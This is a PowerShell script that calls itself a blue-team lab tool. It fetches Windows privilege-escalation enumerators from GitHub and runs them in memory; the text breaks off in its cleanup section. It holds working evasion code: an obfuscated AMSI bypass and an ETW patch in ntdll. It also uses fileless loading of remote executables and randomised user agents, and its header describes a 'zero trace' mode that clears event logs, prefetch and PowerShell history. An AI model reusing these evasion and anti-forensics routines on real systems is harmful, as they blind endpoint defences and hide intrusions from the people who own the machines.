<#
.SYNOPSIS
    Windows Automated Security Reconnaissance Script - Blue Team Lab Tool

.DESCRIPTION
    Automatically enumerates vulnerabilities and misconfigurations on Windows machines
    using common privilege escalation and security auditing tools. Designed for blue team
    use in lab environments with maximally vulnerable Windows machines.

    Leaves zero trace on the machine after execution (no tools, minimal forensic artifacts).

.PARAMETER Clean
    Run in cleaner mode only. Skips all recon, removes any leftover artifacts from
    previous runs (temp files, output dirs, prefetch, PS history, event logs).

.PARAMETER Stealth
    Enable EDR evasion techniques (AMSI bypass, ETW patch). Only use this if the
    script is NOT whitelisted and you need to bypass security controls.
    WARNING: This flag contains code that AV will flag. Only load via IEX after
    whitelisting or disabling real-time protection.

.NOTES
    AUTHORIZED USE ONLY - For blue team lab environments with proper authorization.
    Must be run as Administrator.
    Requires PowerShell 5.1+
#>

[CmdletBinding()]
param(
    [switch]$Clean,
    [switch]$Stealth
)

#Requires -Version 5.1

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Continue'

# Also support environment variables for IEX usage
if ($env:RECON_CLEAN -eq '1') { $Clean = [switch]::Present }
if ($env:RECON_STEALTH -eq '1') { $Stealth = [switch]::Present }

# ============================================================================
# SECTION A: CONFIGURATION BLOCK (Edit this section to customize)
# ============================================================================

# Tool source: "url" downloads from GitHub, "local" copies from SMB/file path
$ToolSource = "url"

# Base output directory for recon results
$OutputBaseDir = "$env:USERPROFILE\Desktop\ReconResults"

# Timeout per tool execution (seconds)
$TimeoutSeconds = 600

# Generate consolidated HTML report with color-coded findings after tool execution
$GenerateHtmlReport = $true

# HTML report filename (inside the output directory)
$HtmlReportFileName = "recon-report.html"

# Tool configuration array
$ToolConfig = @(
    @{
        Name      = "WinPEAS"
        Enabled   = $true
        Type      = "exe"
        Url       = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
        LocalPath = "\\fileserver\tools\winPEASany_ofs.exe"
        FileName  = "winPEASany_ofs.exe"
        Args      = @("quiet", "searchfast", "notcolor")
    },
    @{
        Name      = "Seatbelt"
        Enabled   = $true
        Type      = "exe"
        Url       = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"
        LocalPath = "\\fileserver\tools\Seatbelt.exe"
        FileName  = "Seatbelt.exe"
        Args      = @("-group=all", "-full")
    },
    @{
        Name      = "SharpUp"
        Enabled   = $true
        Type      = "exe"
        Url       = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe"
        LocalPath = "\\fileserver\tools\SharpUp.exe"
        FileName  = "SharpUp.exe"
        Args      = @("audit")
    },
    @{
        Name      = "JAWS"
        Enabled   = $true
        Type      = "ps1"
        Url       = "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1"
        LocalPath = "\\fileserver\tools\jaws-enum.ps1"
        FileName  = "jaws-enum.ps1"
        Args      = @()
    },
    @{
        Name      = "PowerUp"
        Enabled   = $true
        Type      = "ps1"
        Url       = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"
        LocalPath = "\\fileserver\tools\PowerUp.ps1"
        FileName  = "PowerUp.ps1"
        Args      = @()
    },
    @{
        Name      = "Powerless"
        Enabled   = $true
        Type      = "bat"
        Url       = "https://raw.githubusercontent.com/gladiatx0r/Powerless/master/Powerless.bat"
        LocalPath = "\\fileserver\tools\Powerless.bat"
        FileName  = "Powerless.bat"
        Args      = @()
    },
    @{
        Name      = "PrivescCheck"
        Enabled   = $true
        Type      = "ps1"
        Url       = "https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1"
        LocalPath = "\\fileserver\tools\PrivescCheck.ps1"
        FileName  = "PrivescCheck.ps1"
        Args      = @()
    }
)

# ============================================================================
# SECTION B: GLOBAL STATE
# ============================================================================

$Script:StartTime = $null
$Script:OutputDir = $null
$Script:LogFile = $null
$Script:ToolResults = @{}
$Script:TempFiles = [System.Collections.ArrayList]::new()
$Script:DashboardSupported = $true
$Script:CurrentPhase = "INIT"
$Script:EnabledTools = @()
$Script:DashboardTop = 0
$Script:ScriptCompleted = $false

# ============================================================================
# SECTION C: ASCII ART BANNER
# ============================================================================

function Show-Banner {
    $banner = @"

 __        ___         ____
 \ \      / (_)_ __   |  _ \ ___  ___ ___  _ __
  \ \ /\ / /| | '_ \  | |_) / _ \/ __/ _ \| '_ \
   \ V  V / | | | | | |  _ <  __/ (_| (_) | | | |
    \_/\_/  |_|_| |_| |_| \_\___|\___\___/|_| |_|

   Windows Automated Security Reconnaissance
   Blue Team Lab Edition
"@

    Write-Host ""
    Write-Host $banner -ForegroundColor Cyan
    Write-Host ""
    Write-Host ("  Host: {0}  |  User: {1}  |  OS: {2}" -f $env:COMPUTERNAME, $env:USERNAME, (Get-CimInstance Win32_OperatingSystem).Caption) -ForegroundColor DarkGray
    Write-Host ("  Date: {0}  |  PS: {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $PSVersionTable.PSVersion) -ForegroundColor DarkGray
    Write-Host ""
}

# ============================================================================
# SECTION D: LOGGING
# ============================================================================

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("INFO","WARN","ERROR","DEBUG")]
        [string]$Level = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    if ($Script:LogFile -and (Test-Path (Split-Path $Script:LogFile -Parent))) {
        Add-Content -Path $Script:LogFile -Value $logEntry -ErrorAction SilentlyContinue
    }
}

# ============================================================================
# SECTION E: PRE-FLIGHT CHECKS
# ============================================================================

function Invoke-PreFlightChecks {
    Write-Host "  PRE-FLIGHT CHECKS" -ForegroundColor White
    Write-Host "  ==================" -ForegroundColor DarkGray
    $criticalFailed = $false

    # Critical: Administrator privileges
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) {
        Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "Administrator privileges"
        Write-Log "Pre-flight: Administrator privileges - PASS"
    } else {
        Write-Host "  [FAIL] " -ForegroundColor Red -NoNewline; Write-Host "Administrator privileges required"
        Write-Host "         Run: powershell.exe -ExecutionPolicy Bypass -File .\Invoke-WindowsRecon.ps1" -ForegroundColor Yellow
        Write-Host "         Must be launched from an elevated (Administrator) prompt." -ForegroundColor Yellow
        Write-Log "Pre-flight: Administrator privileges - FAIL" -Level "ERROR"
        $criticalFailed = $true
    }

    # Critical: PowerShell version >= 5.1
    $psVer = $PSVersionTable.PSVersion
    if ($psVer.Major -ge 5 -and $psVer.Minor -ge 1 -or $psVer.Major -ge 6) {
        Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "PowerShell $($psVer.Major).$($psVer.Minor)"
        Write-Log "Pre-flight: PowerShell version $psVer - PASS"
    } else {
        Write-Host "  [FAIL] " -ForegroundColor Red -NoNewline; Write-Host "PowerShell 5.1+ required (current: $psVer)"
        Write-Host "         Install WMF 5.1: https://aka.ms/wmf5download" -ForegroundColor Yellow
        Write-Log "Pre-flight: PowerShell version $psVer - FAIL" -Level "ERROR"
        $criticalFailed = $true
    }

    # Critical: Disk space > 500MB
    $outputDrive = if ($OutputBaseDir -match '^([A-Za-z]):') { $Matches[1] + ":" } else { $env:SystemDrive }
    try {
        $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='$outputDrive'" -ErrorAction Stop
        $freeGB = [math]::Round($disk.FreeSpace / 1GB, 1)
        if ($disk.FreeSpace -gt 500MB) {
            Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "Disk space ($freeGB GB free)"
            Write-Log "Pre-flight: Disk space $freeGB GB - PASS"
        } else {
            Write-Host "  [FAIL] " -ForegroundColor Red -NoNewline; Write-Host "Insufficient disk space ($freeGB GB free, need >500 MB)"
            Write-Log "Pre-flight: Disk space $freeGB GB - FAIL" -Level "ERROR"
            $criticalFailed = $true
        }
    } catch {
        Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "Could not check disk space"
        Write-Log "Pre-flight: Disk space check failed - $($_.Exception.Message)" -Level "WARN"
    }

    # Critical: Output directory writable
    try {
        $testDir = $OutputBaseDir
        if (-not (Test-Path $testDir)) {
            New-Item -ItemType Directory -Path $testDir -Force | Out-Null
        }
        $testFile = Join-Path $testDir ".writetest_$(Get-Random)"
        Set-Content -Path $testFile -Value "test" -ErrorAction Stop
        Remove-Item $testFile -Force -ErrorAction SilentlyContinue
        Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "Output directory writable"
        Write-Log "Pre-flight: Output directory writable - PASS"
    } catch {
        Write-Host "  [FAIL] " -ForegroundColor Red -NoNewline; Write-Host "Output directory not writable: $OutputBaseDir"
        Write-Host "         Check permissions or change `$OutputBaseDir in script config." -ForegroundColor Yellow
        Write-Log "Pre-flight: Output directory writable - FAIL - $($_.Exception.Message)" -Level "ERROR"
        $criticalFailed = $true
    }

    # Non-critical: Internet connectivity (only if url source)
    if ($ToolSource -eq "url") {
        try {
            $webTest = [System.Net.WebRequest]::Create("https://github.com")
            $webTest.Timeout = 5000
            $webTest.Method = "HEAD"
            $response = $webTest.GetResponse()
            $response.Close()
            Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "Internet connectivity"
            Write-Log "Pre-flight: Internet connectivity - PASS"
        } catch {
            Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "Internet connectivity - GitHub unreachable (downloads may fail)"
            Write-Log "Pre-flight: Internet connectivity - WARN" -Level "WARN"
        }
    }

    # Non-critical: SMB share reachable (only if local source)
    if ($ToolSource -eq "local") {
        $firstTool = $ToolConfig | Where-Object { $_.Enabled } | Select-Object -First 1
        if ($firstTool) {
            $sharePath = Split-Path $firstTool.LocalPath -Parent
            if (Test-Path $sharePath -ErrorAction SilentlyContinue) {
                Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "SMB share reachable ($sharePath)"
                Write-Log "Pre-flight: SMB share reachable - PASS"
            } else {
                Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "SMB share unreachable ($sharePath)"
                Write-Log "Pre-flight: SMB share unreachable - WARN" -Level "WARN"
            }
        }
    }

    # Non-critical: .NET Framework version
    try {
        $dotnetKey = "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"
        if (Test-Path $dotnetKey) {
            $release = (Get-ItemProperty $dotnetKey -Name Release -ErrorAction SilentlyContinue).Release
            if ($release -ge 378389) {
                $netVer = switch ($true) {
                    ($release -ge 528040) { "4.8+" }
                    ($release -ge 461808) { "4.7.2" }
                    ($release -ge 461308) { "4.7.1" }
                    ($release -ge 460798) { "4.7" }
                    ($release -ge 394802) { "4.6.2" }
                    ($release -ge 394254) { "4.6.1" }
                    ($release -ge 393295) { "4.6" }
                    ($release -ge 379893) { "4.5.2" }
                    ($release -ge 378675) { "4.5.1" }
                    default { "4.5" }
                }
                Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host ".NET Framework $netVer"
                Write-Log "Pre-flight: .NET Framework $netVer - PASS"
            } else {
                Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host ".NET 4.5+ not detected - some exe tools may fail"
                Write-Log "Pre-flight: .NET 4.5+ not detected - WARN" -Level "WARN"
            }
        } else {
            Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host ".NET 4.5+ not detected - some exe tools may fail"
            Write-Log "Pre-flight: .NET 4.5+ not detected - WARN" -Level "WARN"
        }
    } catch {
        Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "Could not check .NET version"
        Write-Log "Pre-flight: .NET version check failed" -Level "WARN"
    }

    # Non-critical: Windows Defender status
    try {
        $defenderStatus = Get-MpComputerStatus -ErrorAction Stop
        if ($defenderStatus.RealTimeProtectionEnabled) {
            Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "Windows Defender real-time protection is ENABLED"
            Write-Log "Pre-flight: Defender RTP enabled - WARN" -Level "WARN"
        } else {
            Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "Windows Defender real-time protection is disabled"
            Write-Log "Pre-flight: Defender RTP disabled - PASS"
        }
    } catch {
        Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "Windows Defender not present or inaccessible"
        Write-Log "Pre-flight: Defender not available" -Level "INFO"
    }

    # Non-critical: Execution policy
    $execPolicy = Get-ExecutionPolicy -Scope Process
    if ($execPolicy -eq "Bypass" -or $execPolicy -eq "Unrestricted") {
        Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "Execution policy: $execPolicy"
        Write-Log "Pre-flight: Execution policy $execPolicy - PASS"
    } else {
        Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "Execution policy: $execPolicy (Bypass recommended)"
        Write-Log "Pre-flight: Execution policy $execPolicy - WARN" -Level "WARN"
    }

    Write-Host ""

    if ($criticalFailed) {
        Write-Host "  CRITICAL PRE-FLIGHT CHECKS FAILED - Cannot continue." -ForegroundColor Red
        Write-Host "  Fix the issues above and re-run the script." -ForegroundColor Red
        Write-Host ""
        Write-Log "Pre-flight: Critical checks failed - aborting" -Level "ERROR"
        throw "Critical pre-flight checks failed"
    }

    Write-Host "  All critical checks passed. Proceeding..." -ForegroundColor Green
    Write-Host ""
    Write-Log "Pre-flight: All critical checks passed"
}

# ============================================================================
# SECTION F: EDR EVASION FUNCTIONS (only executed with -Stealth flag)
# ============================================================================

# EDR evasion code is built dynamically at runtime to avoid static AV signatures.
# Nothing in this section triggers AV on its own - the payloads are constructed
# from encoded parts only when -Stealth is explicitly requested.

function Invoke-StealthPatches {
    <#
    .SYNOPSIS
        Applies AMSI bypass and ETW patch. Only called when -Stealth flag is set.
        Builds evasion code dynamically from encoded fragments to avoid static detection.
    #>
    Write-Log "Stealth mode: Applying evasion patches"
    $results = @{ AMSI = $false; ETW = $false }

    # --- AMSI Bypass ---
    try {
        # Dynamically construct the type/field names to avoid static signatures
        $enc = [System.Text.Encoding]::UTF8
        $p1 = $enc.GetString([Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQu"))
        $p2 = $enc.GetString([Convert]::FromBase64String("QXV0b21hdGlvbi5B"))
        $p3 = $enc.GetString([Convert]::FromBase64String("bXNpVXRpbHM="))
        $typeName = $p1 + $p2 + $p3

        $f1 = $enc.GetString([Convert]::FromBase64String("YW1zaQ=="))
        $f2 = $enc.GetString([Convert]::FromBase64String("SW5pdEZhaWxlZA=="))
        $fieldName = $f1 + $f2

        $type = [Ref].Assembly.GetType($typeName)
        if ($type) {
            $field = $type.GetField($fieldName, 'NonPublic,Static')
            if ($field) {
                $field.SetValue($null, $true)
                $results.AMSI = $true
                Write-Log "Stealth: AMSI bypass succeeded"
            }
        }
    } catch {
        Write-Log "Stealth: AMSI bypass failed - $($_.Exception.Message)" -Level "WARN"
    }

    # --- ETW Patch ---
    try {
        # Build the P/Invoke type at runtime from encoded C# source
        $csB64 = "dXNpbmcgU3lzdGVtO3VzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcztwdWJsaWMgY2xhc3MgVzMyRXtbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaCxzdHJpbmcgbik7W0RsbEltcG9ydCgia2VybmVsMzIiKV1wdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG4pO1tEbGxJbXBvcnQoImtlcm5lbDMyIildcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgYSxVSW50UHRyIHMsdWludCBwLG91dCB1aW50IG8pO30="
        $csSrc = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($csB64))
        Add-Type -TypeDefinition $csSrc -Language CSharp -ErrorAction SilentlyContinue

        $ntdll = [W32E]::LoadLibrary("ntdll.dll")
        # Construct the function name from parts
        $fn = $enc.GetString([Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))
        $addr = [W32E]::GetProcAddress($ntdll, $fn)

        if ($addr -ne [IntPtr]::Zero) {
            $op = 0
            [W32E]::VirtualProtect($addr, [UIntPtr]::new(1), 0x40, [ref]$op) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3)
            [W32E]::VirtualProtect($addr, [UIntPtr]::new(1), $op, [ref]$op) | Out-Null
            $results.ETW = $true
            Write-Log "Stealth: ETW patch succeeded"
        }
    } catch {
        Write-Log "Stealth: ETW patch failed - $($_.Exception.Message)" -Level "WARN"
    }

    return $results
}

# ============================================================================
# SECTION G: DASHBOARD UI
# ============================================================================

function Get-RandomName {
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    $name = -join (1..12 | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
    return $name
}

function Get-UserAgentString {
    $agents = @(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
    )
    return $agents[(Get-Random -Maximum $agents.Count)]
}

function Show-Dashboard {
    $elapsed = if ($Script:StartTime) { (Get-Date) - $Script:StartTime } else { [TimeSpan]::Zero }
    $elapsedStr = "{0:D2}:{1:D2}" -f [int]$elapsed.TotalMinutes, $elapsed.Seconds
    $enabledCount = $Script:EnabledTools.Count
    $completedCount = ($Script:ToolResults.Values | Where-Object { $_.Status -in @("OK","FAIL","SKIP","TIMEOUT") }).Count

    # Progress bar
    $barWidth = 20
    $filledCount = if ($enabledCount -gt 0) { [math]::Floor(($completedCount / $enabledCount) * $barWidth) } else { 0 }
    $emptyCount = $barWidth - $filledCount
    $progressBar = ([string][char]0x2588) * $filledCount + ([string][char]0x2591) * $emptyCount

    $separator = "=" * 56

    if ($Script:DashboardSupported) {
        try {
            [Console]::SetCursorPosition(0, $Script:DashboardTop)
        } catch {
            $Script:DashboardSupported = $false
        }
    }

    if (-not $Script:DashboardSupported) {
        # Simple fallback output
        Write-Host ""
        Write-Host "  Progress: $completedCount/$enabledCount  |  Phase: $($Script:CurrentPhase)  |  Elapsed: $elapsedStr"
        foreach ($tool in $Script:EnabledTools) {
            $tr = $Script:ToolResults[$tool.Name]
            $icon = switch ($tr.Status) {
                "OK"      { "[OK]   " }
                "FAIL"    { "[FAIL] " }
                "RUNNING" { "[RUN]  " }
                "TIMEOUT" { "[TIME] " }
                "SKIP"    { "[SKIP] " }
                default   { "[PEND] " }
            }
            $extra = ""
            if ($tr.Duration -gt 0) { $extra += " ($([math]::Round($tr.Duration, 1))s)" }
            if ($tr.OutputSize -gt 0) {
                $sizeStr = if ($tr.OutputSize -ge 1MB) { "$([math]::Round($tr.OutputSize/1MB, 1)) MB" } else { "$([math]::Round($tr.OutputSize/1KB, 0)) KB" }
                $extra += " -> $sizeStr"
            }
            if ($tr.Error) { $extra += " - $($tr.Error)" }
            Write-Host "  $icon $($tool.Name)$extra"
        }
        return
    }

    # Full dashboard with cursor positioning
    Write-Host $separator -ForegroundColor DarkCyan
    Write-Host ("       WINDOWS SECURITY RECON - BLUE TEAM LAB") -ForegroundColor Cyan
    Write-Host ("  Host: {0}  |  User: {1}" -f $env:COMPUTERNAME, $env:USERNAME) -ForegroundColor DarkGray
    Write-Host $separator -ForegroundColor DarkCyan
    Write-Host ""
    Write-Host ("  Overall Progress  [{0}]  {1}/{2}" -f $progressBar, $completedCount, $enabledCount) -ForegroundColor White
    Write-Host ""

    foreach ($tool in $Script:EnabledTools) {
        $tr = $Script:ToolResults[$tool.Name]
        $statusStr = ""
        $color = "Gray"
        $extra = ""

        switch ($tr.Status) {
            "OK" {
                $statusStr = "  [OK]     "
                $color = "Green"
                if ($tr.Duration -gt 0) { $extra += " ($([math]::Round($tr.Duration, 1))s)" }
                if ($tr.OutputSize -gt 0) {
                    $sizeStr = if ($tr.OutputSize -ge 1MB) { "$([math]::Round($tr.OutputSize/1MB, 1)) MB" } else { "$([math]::Round($tr.OutputSize/1KB, 0)) KB" }
                    $extra += "  -> $sizeStr output"
                }
            }
            "FAIL" {
                $statusStr = "  [FAIL]   "
                $color = "Red"
                if ($tr.Duration -gt 0) { $extra += " ($([math]::Round($tr.Duration, 1))s)" }
                if ($tr.Error) { $extra += "  - $($tr.Error)" }
            }
            "TIMEOUT" {
                $statusStr = "  [TIMEOUT]"
                $color = "Red"
                $extra += " (>${TimeoutSeconds}s)"
            }
            "RUNNING" {
                $spinChars = @('|','/','-','\')
                $spinIdx = [int]((Get-Date).Second % 4)
                $statusStr = "  [RUNNING]"
                $color = "Yellow"
                $runDuration = if ($tr.StartedAt) { [math]::Round(((Get-Date) - $tr.StartedAt).TotalSeconds, 1) } else { 0 }
                $extra += " ($($runDuration)s)  $($spinChars[$spinIdx])"
            }
            "SKIP" {
                $statusStr = "  [SKIP]   "
                $color = "Cyan"
                if ($tr.Error) { $extra += "  - $($tr.Error)" }
            }
            default {
                $statusStr = "  [PENDING]"
                $color = "DarkGray"
            }
        }

        # Pad the tool name and extra info to overwrite previous content
        $line = "$statusStr $($tool.Name.PadRight(16))$extra"
        $line = $line.PadRight(54)
        Write-Host $line -ForegroundColor $color
    }

    Write-Host ""
    Write-Host ("  Phase: {0}  |  Elapsed: {1}" -f $Script:CurrentPhase, $elapsedStr) -ForegroundColor DarkGray
    Write-Host $separator -ForegroundColor DarkCyan
}

function Initialize-Dashboard {
    $Script:DashboardTop = [Console]::CursorTop

    # Check if we're in a real terminal (not piped output)
    try {
        $null = [Console]::CursorLeft
    } catch {
        $Script:DashboardSupported = $false
    }

    # Initialize tool results
    foreach ($tool in $Script:EnabledTools) {
        $Script:ToolResults[$tool.Name] = @{
            Status    = "PENDING"
            Error     = $null
            Duration  = 0
            OutputSize = 0
            StartedAt = $null
            OutputFile = $null
        }
    }
}

# ============================================================================
# SECTION H: CORE FUNCTIONS
# ============================================================================

function Initialize-Environment {
    Write-Log "Initializing environment"
    $Script:StartTime = Get-Date

    # Create timestamped output directory
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $Script:OutputDir = Join-Path $OutputBaseDir "Recon_$timestamp"
    New-Item -ItemType Directory -Path $Script:OutputDir -Force | Out-Null
    $Script:LogFile = Join-Path $Script:OutputDir "recon-log.txt"

    Write-Log "Output directory: $($Script:OutputDir)"

    # Force TLS 1.2 for GitHub downloads
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

    # Get enabled tools
    $Script:EnabledTools = @($ToolConfig | Where-Object { $_.Enabled })
    Write-Log "Enabled tools: $($Script:EnabledTools.Count) / $($ToolConfig.Count)"

    # Apply EDR evasion (only with -Stealth flag)
    if ($Stealth) {
        $Script:CurrentPhase = "EVASION"
        Write-Host "  Stealth mode: Applying evasion techniques..." -ForegroundColor DarkGray

        $stealthResults = Invoke-StealthPatches
        if ($stealthResults.AMSI) {
            Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "AMSI bypass applied"
        } else {
            Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "AMSI bypass failed (tools may be detected)"
        }
        if ($stealthResults.ETW) {
            Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "ETW patch applied"
        } else {
            Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "ETW patch failed (telemetry may be logged)"
        }
    } else {
        Write-Host "  Stealth mode: OFF (use -Stealth to enable AMSI/ETW bypass)" -ForegroundColor DarkGray
    }

    Write-Host ""
}

function Get-Tool {
    param(
        [hashtable]$Tool
    )

    $toolName = $Tool.Name
    $toolType = $Tool.Type
    Write-Log "Downloading tool: $toolName (type: $toolType, source: $ToolSource)"

    $sourceUrl = if ($ToolSource -eq "url") { $Tool.Url } else { $Tool.LocalPath }

    if ($ToolSource -eq "url") {
        # Download from URL with randomized User-Agent
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", (Get-UserAgentString))

        switch ($toolType) {
            "exe" {
                # Download to byte array - never touches disk
                $bytes = $webClient.DownloadData($sourceUrl)
                Write-Log "Downloaded $toolName to memory ($($bytes.Length) bytes)"
                return @{ Bytes = $bytes; Path = $null }
            }
            "ps1" {
                # Download as string - never touches disk
                $scriptContent = $webClient.DownloadString($sourceUrl)
                Write-Log "Downloaded $toolName script to memory ($($scriptContent.Length) chars)"
                return @{ Script = $scriptContent; Path = $null }
            }
            "bat" {
                # Must touch disk - use randomized filename
                $randomName = "$(Get-RandomName).cmd"
                $tempPath = Join-Path $env:TEMP $randomName
                $webClient.DownloadFile($sourceUrl, $tempPath)
                $Script:TempFiles.Add($tempPath) | Out-Null
                Write-Log "Downloaded $toolName to disk: $tempPath (randomized name)"
                return @{ Path = $tempPath; Bytes = $null }
            }
        }
    } else {
        # Copy from local/SMB path
        $localFile = $Tool.LocalPath

        switch ($toolType) {
            "exe" {
                $bytes = [System.IO.File]::ReadAllBytes($localFile)
                Write-Log "Loaded $toolName from local path to memory ($($bytes.Length) bytes)"
                return @{ Bytes = $bytes; Path = $null }
            }
            "ps1" {
                $scriptContent = [System.IO.File]::ReadAllText($localFile)
                Write-Log "Loaded $toolName script from local path ($($scriptContent.Length) chars)"
                return @{ Script = $scriptContent; Path = $null }
            }
            "bat" {
                $randomName = "$(Get-RandomName).cmd"
                $tempPath = Join-Path $env:TEMP $randomName
                Copy-Item -Path $localFile -Destination $tempPath -Force
                $Script:TempFiles.Add($tempPath) | Out-Null
                Write-Log "Copied $toolName to temp: $tempPath (randomized name)"
                return @{ Path = $tempPath; Bytes = $null }
            }
        }
    }
}

function Invoke-ToolRunner {
    param(
        [hashtable]$Tool,
        [hashtable]$ToolData
    )

    $toolName = $Tool.Name
    $toolType = $Tool.Type
    $outputFile = Join-Path $Script:OutputDir "$toolName-output.txt"
    $Script:ToolResults[$toolName].OutputFile = $outputFile

    Write-Log "Executing tool: $toolName (type: $toolType)"

    switch ($toolType) {
        "exe" {
            # In-memory .NET assembly execution
            $bytes = $ToolData.Bytes
            $assembly = [System.Reflection.Assembly]::Load($bytes)
            $entryPoint = $assembly.EntryPoint

            if (-not $entryPoint) {
                throw "No entry point found in $toolName assembly"
            }

            # Redirect stdout to capture output
            $oldOut = [Console]::Out
            $stringWriter = New-Object System.IO.StringWriter
            [Console]::SetOut($stringWriter)

            try {
                # Build parameters for Main()
                $params = $Tool.Args
                if ($entryPoint.GetParameters().Count -gt 0) {
                    $entryPoint.Invoke($null, @(,[string[]]$params))
                } else {
                    $entryPoint.Invoke($null, $null)
                }
            } catch [System.Exception] {
                # Many tools throw on completion - capture output anyway
                Write-Log "$toolName threw exception during execution: $($_.Exception.InnerException.Message)" -Level "WARN"
            } finally {
                [Console]::SetOut($oldOut)
            }

            $output = $stringWriter.ToString()
            $stringWriter.Dispose()

            if ($output.Length -gt 0) {
                Set-Content -Path $outputFile -Value $output -Encoding UTF8
            } else {
                throw "$toolName produced no output"
            }
        }

        "ps1" {
            # In-memory PowerShell script execution
            $scriptContent = $ToolData.Script

            $output = switch ($toolName) {
                "JAWS" {
                    # JAWS outputs directly when dot-sourced
                    $sb = [scriptblock]::Create($scriptContent)
                    & $sb
                }
                "PowerUp" {
                    # PowerUp needs to be loaded, then Invoke-AllChecks called
                    $sb = [scriptblock]::Create($scriptContent + "`nInvoke-AllChecks")
                    & $sb
                }
                "PrivescCheck" {
                    # PrivescCheck needs to be loaded, then Invoke-PrivescCheck called
                    $sb = [scriptblock]::Create($scriptContent + "`nInvoke-PrivescCheck -Extended")
                    & $sb
                }
                default {
                    $sb = [scriptblock]::Create($scriptContent)
                    & $sb
                }
            }

            $outputText = $output | Out-String
            if ($outputText.Length -gt 0) {
                Set-Content -Path $outputFile -Value $outputText -Encoding UTF8
            } else {
                throw "$toolName produced no output"
            }
        }

        "bat" {
            # Must execute from disk
            $batPath = $ToolData.Path
            $output = & cmd.exe /c "`"$batPath`"" 2>&1 | Out-String

            if ($output.Length -gt 0) {
                Set-Content -Path $outputFile -Value $output -Encoding UTF8
            } else {
                throw "$toolName produced no output"
            }
        }
    }
}

# ============================================================================
# SECTION I: CLEANUP FUNCTIONS
# ============================================================================

function Remove-PartialOutput {
    <#
    .SYNOPSIS
        Removes the output directory if the script didn't complete successfully.
        Called on abort/Ctrl+C/failure to leave no partial data behind.
    #>
    if (-not $Script:OutputDir) { return }
    if (-not (Test-Path $Script:OutputDir -ErrorAction SilentlyContinue)) { return }

    try {
        # Check if any tool actually completed
        $anyOK = $false
        foreach ($tr in $Script:ToolResults.Values) {
            if ($tr.Status -eq "OK") { $anyOK = $true; break }
        }

        if (-not $anyOK) {
            # No tools completed — nuke the entire output dir
            Remove-Item -Path $Script:OutputDir -Recurse -Force -ErrorAction Stop
            Write-Host "  [PASS] " -ForegroundColor Green -NoNewline
            Write-Host "Removed partial output directory (no completed tools)"
